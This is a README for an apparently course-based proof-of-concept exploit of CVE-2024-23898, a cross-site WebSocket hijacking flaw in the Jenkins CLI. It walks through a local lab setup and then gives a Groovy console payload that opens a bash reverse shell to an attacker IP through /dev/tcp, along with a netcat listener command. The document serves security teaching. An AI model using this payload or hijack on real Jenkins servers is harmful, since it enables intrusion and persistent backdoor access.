# Jenkins CLI Websocket Hijacking - PoC
A proof of concept cross-site WebSocket hijacking exploit for CVE-2024-23898 — a vulnerability affecting Jenkins versions 2.217-2.441. 
 
This exploits targets the Jenkins CLI that can be used to remotely access and issue commands to a Jenkins control server.  Through this exploit a remote attacker can gain access to and establish a persistent back-door to a Jenkins control server if an administrator is tricked into visiting a malicious site while logged-in to the target Jenkins control server.

---

#### **DISCLAIMER**  
This code is intended for educational purposes only and solely for the use of the Hacking & Offensive Security course at Carnegie Mellon University. This code should not be weaponized or otherwise used to craft malware. The authors explicitly condemn any attempt to do so.

---

# Setting Up Jenkins
- Run "docker-compose build && docker-compose up -d"
- Navigate to http://localhost:8080, you will be prompted for an admin password
- Open a shell in the jenkins docker container (NOT THE POSTGRES ONE)
    - "docker exec -it <container_id> bash"
    - cd to directory listeed on the Jenkins page, acquire the password
- Set up a basic admin account (remember the password) and install default plugins 
-Configure anonymous users with basic permissions by going to Manage Jenkins > Security 
	- Set authorization type to "Matrix-based"
	- Allow anonymous users to read "Overall" and "Job"

# Conducting Websocket Hijacking
- Open Firefox, go to Settings > Security & Privacy
    - Set Browser Privacy to custom, toggle Cookies "off" (this makes Firefox allow all cookies through)
- Go to Jenkins, login as the admin, making sure to click "Keep me signed in"
- Lauch evilApp.py, visiting on http://localhost:5000
    - Go to Network and hit refresh
    - Click on the packet with file "ws" and go to Response, you should see that is says "Authenticated as: admin""
        -  You can also check "Cookies" to see the remember-me cookie

# Executing a reverse shell
- In your machine's terminal, start a netcat listener with `nc -l <port_num>` (replace <port_num> with any unused port number)
- You must obtain your computer's IP address as seen by Docker. On Mac you can find this with the command `ipconfig getifaddr en0`
- Assuming your Jenkins server is running, go to `[http://localhost:8080/script](http://localhost:8080/script)`. Log in as the admin account if you have not already.
- Paste and execute this payload into the Groovy script console: `['bash', '-c', 'bash -i >& /dev/tcp/<attacker_ip>/<port_num> 0>&1'].execute()`
- Go back to the terminal with the netcat listener. You should be in the Jenkins server's file system and able to do anything the admin user can.
